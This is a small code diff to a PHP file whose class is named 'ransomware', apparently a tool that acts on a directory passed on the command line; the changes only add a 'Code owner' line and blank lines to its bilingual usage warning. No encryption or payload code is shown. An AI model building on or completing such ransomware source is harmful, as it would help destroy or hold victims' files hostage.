@@ -96,6 +96,8 @@ class ransomware{
 //Caso o usuario passe menos de 2 argumentos exiba:
 if($argc < 2){
     echo "
+    Code owner:Kanui-C
+    
     É necessario passar o diretorio!\n
     It is necessary to pass the directory!\n
 
@@ -104,6 +106,7 @@ if($argc < 2){
 
     Tenha cuidado!\n
     Be Careful!\n
+    
     
     
     if you don't speak portuguese use google translator!\n
